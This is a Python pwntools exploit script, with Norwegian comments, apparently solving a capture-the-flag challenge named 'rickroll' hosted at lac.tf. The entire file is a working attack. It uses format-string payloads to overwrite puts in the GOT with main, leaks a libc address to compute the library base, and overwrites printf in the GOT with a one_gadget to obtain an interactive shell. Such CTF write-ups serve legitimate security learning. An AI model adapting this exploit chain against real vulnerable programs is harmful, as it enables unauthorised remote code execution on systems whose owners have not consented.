#!/usr/bin/env python3

from pwn import *

exe = ELF("./rickroll_patched")
libc = ELF("./libc-2.31.so")
ld = ELF("./ld-2.31.so")

context.binary = exe

#p = process("./rickroll_patched")
#gdb.attach(p)

p = remote("lac.tf", 31135)

puts_got = 0x404018
ret_to_main = 0x40117d

first_write = {puts_got: ret_to_main} # overskriv puts med main for å printfe flere ganger
payload = fmtstr_payload(6, first_write) #6 offset funnet med "AAAA %x %x %x %x %x %x %x %x %x %x"
log.info(f"{payload = }")

p.recvuntil(b"Lyrics:")
p.sendline(payload)

#leaking libc:
# out = ""
# for i in range(40, 60):
#     out += f"{i}=%{i}$p "
# p.recvuntil(b"Lyrics:")
# p.sendline(out)
# 40 ser ut som en libc adresse

p.recvuntil(b"Lyrics")
p.sendline(b"libc= %40$p")
p.recvuntil(b"libc=")
leaked = int(p.recvline().strip().decode(), 16)
libc.address = leaked - (0x7f7ef4b33d0a - 0x7f7ef4b10000) #gdb attach lokalt en gang => leak minus libc base i den prosessen er konstant offset fra libc base
log.success(f"{hex(libc.address) = }")

#one gadget time
#one_gadget libc-2.31.so
one_gadget = 0xc9620 + libc.address
printf_got = 0x404028 # møtte onegadget kriteriene rett før printf kalles (tom rdi/[rdi] og rsi/[rsi])

second_write = {printf_got: one_gadget}
second_payload = fmtstr_payload(8, second_write) # fant offsett på samme måte
log.info(f"{second_payload = }")

p.recvuntil(b"Lyrics:")
p.sendline(second_payload)

p.interactive()

